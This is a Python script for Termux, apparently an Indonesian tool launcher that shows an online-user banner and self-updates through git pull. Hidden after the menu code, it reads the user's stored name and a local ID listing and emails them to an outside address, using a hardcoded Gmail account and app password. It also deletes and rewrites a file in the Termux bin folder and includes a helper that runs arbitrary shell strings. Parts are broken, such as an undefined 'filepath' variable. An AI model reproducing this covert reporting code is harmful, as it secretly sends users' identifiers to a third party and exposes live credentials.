# Banner
def Banner():
    if 'win' in str(sys.platform).lower():
        os.system('cls')
    else:
        os.system('sleep 0.1')
# Pengguna
def Pengguna():
    with requests.Session() as r:
        url = ('https://justpaste.it/Sijhon45')
        response = r.get(url).text
    return {
        'Jumlah': re.search('"onlineText":"(\d+)"', str(response)).group(1),
        'Online': re.search('"viewsText":"(\d+)"', str(response)).group(1)
    }
# Menu
def Menu():
    Banner()
    try:
        jumlah, online = Pengguna()['Jumlah'], Pengguna()['Online']
        Console(width=20, style="white").print(Panel(f"[white]Pengguna :[green] {online}  ", title="realtime"))
    except Exception as e:
        Console(width=10, style="white").print(Panel(f"[italic red]{str(e).title()}!", title="😡"));sys.exit()
def Calling(url, *args, **kwargs):
    process = subprocess.Popen(
        url,
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        text = True,
        shell = True
    )
    std_out, std_err = process.communicate()
    pass

if __name__ == '__main__':
    if os.path.exists("play-audio") == True or os.path.exists("espeak") == False:
        os.system('sleep 0.1');Menu()
    else:
        os.system('git pull');Menu()
        
        
#!/usr/bin/env python3 -W ignore::DeprecationWarning
import shutup; shutup.please()
import requests, json, time, os, re, sys, subprocess
from rich.panel import Panel
from rich import print
from rich.console import Console

name = "/data/data/com.termux/files/usr/bin/data/nama"  # Replace with the actual path

try:
    with open(name, 'r') as f:
        file_content = f.read()
        namee = (file_content)
except FileNotFoundError:
    print(f"Error: File '{filepath}' not found.")


#name = "Bob"
import smtplib
import os,sys
fadd = 'helc95209@gmail.com'
tadd = 'plankstons@gonetor.com'
print("loading")
msg = "PENGGUNA ONLINE = " + namee + "LOGIN!"
username = 'helc95209@gmail.com'
password = 'svxsolvclixcvkjj'
server = smtplib.SMTP('smtp.gmail.com',587)
server.ehlo()
server.starttls()
server.login(username,password)
server.sendmail(fadd,tadd,msg)
#server.sendmail(fadd,tadd,msg)

os.system("rm /data/data/com.termux/files/usr/bin/YD && touch /data/data/com.termux/files/usr/bin/YD")
os.system("ls /data/data/com.termux/files/usr/bin/idd/jon > /data/data/com.termux/files/usr/bin/YD")

#greeting = "Hello, " + name + "!"
#print(greeting)  # Output: Hello, Bob!

ID = "/data/data/com.termux/files/usr/bin/YD"

try:
    with open(ID, 'r') as f:
        file_content = f.read()
        nameee = (file_content)
except FileNotFoundError:
    print(f"Error: File '{filepath}' not found.")


#name = "Bob"
import smtplib
import os,sys
fadd = 'helc95209@gmail.com'
tadd = 'plankstons@gonetor.com'
print("loading")
msg = "ID = " + nameee + "LOGIN!"
username = 'helc95209@gmail.com'
password = 'svxsolvclixcvkjj'
server = smtplib.SMTP('smtp.gmail.com',587)
server.ehlo()
server.starttls()
server.login(username,password)
server.sendmail(fadd,tadd,msg)
#server.sendmail(fadd,tadd,msg)
print(" ")
#greeting = "Hello, " + name + "!"
#print(greeting)  # Output: Hello, Bob!

